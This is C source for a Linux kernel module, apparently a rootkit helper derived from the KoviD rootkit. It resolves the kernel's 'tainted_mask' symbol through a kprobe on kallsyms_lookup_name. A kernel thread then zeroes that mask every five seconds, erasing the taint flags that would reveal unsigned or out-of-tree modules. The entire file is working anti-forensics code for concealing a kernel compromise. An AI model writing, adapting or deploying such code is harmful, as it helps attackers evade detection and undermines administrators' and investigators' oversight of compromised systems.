#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kprobes.h>
#include <linux/version.h>

#define RESET_THREAD_NAME "zer0t"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("zero tainted based in kovid");

static struct task_struct *cleaner_thread = NULL;
static unsigned long *taint_mask_ptr = NULL;

static struct kprobe probe_lookup = {
    .symbol_name = "kallsyms_lookup_name"
};

static unsigned long *get_taint_mask_address(void) {
    typedef unsigned long (*lookup_name_fn)(const char *name);

    lookup_name_fn kallsyms_lookup_fn;

    unsigned long *taint_addr = NULL;

    if (register_kprobe(&probe_lookup) < 0) {
        printk(KERN_ERR "Failed to register kprobe.\n");
        return NULL;
    }

    kallsyms_lookup_fn = (lookup_name_fn) probe_lookup.addr;

    unregister_kprobe(&probe_lookup);

    if (kallsyms_lookup_fn) {
        taint_addr = (unsigned long *)kallsyms_lookup_fn("tainted_mask");

        if (taint_addr) {
            printk(KERN_INFO "tainted_mask address: %px\n", taint_addr);
        } else {
            printk(KERN_ERR "Could not find tainted_mask address.\n");
        }
    } else {
        printk(KERN_ERR "kallsyms_lookup_name not found.\n");
    }

    return taint_addr;
}

static void reset_taint_mask(void) {
    if (taint_mask_ptr && *taint_mask_ptr != 0) {
        printk(KERN_INFO "tainted_mask before reset: %lu\n", *taint_mask_ptr);

        *taint_mask_ptr = 0;

        printk(KERN_INFO "tainted_mask reset to: %lu\n", *taint_mask_ptr);
    } else {
        printk(KERN_WARNING "Invalid tainted_mask address or already reseted.\n");
    }
}

static int zt_thread(void *data) {
    while (!kthread_should_stop()) {
        reset_taint_mask();
        ssleep(5);
    }
    return 0;
}

static int __init zerot_init(void) {
    printk(KERN_INFO "tainted_mask cleaner module loaded.\n");

    taint_mask_ptr = get_taint_mask_address();
    if (!taint_mask_ptr) {
        printk(KERN_ERR "Could not get tainted_mask address.\n");
        return -EFAULT;
    }

    cleaner_thread = kthread_run(zt_thread, NULL, RESET_THREAD_NAME);
    if (IS_ERR(cleaner_thread)) {
        printk(KERN_ERR "Failed to start tainted_mask cleaner thread.\n");
        return PTR_ERR(cleaner_thread);
    }

    return 0;
}

static void __exit zerot_exit(void) {
    if (cleaner_thread) {
        kthread_stop(cleaner_thread);
        printk(KERN_INFO "zerot stopped.\n");
    }
    printk(KERN_INFO "zerot unloaded.\n");
}

module_init(zerot_init);
module_exit(zerot_exit);
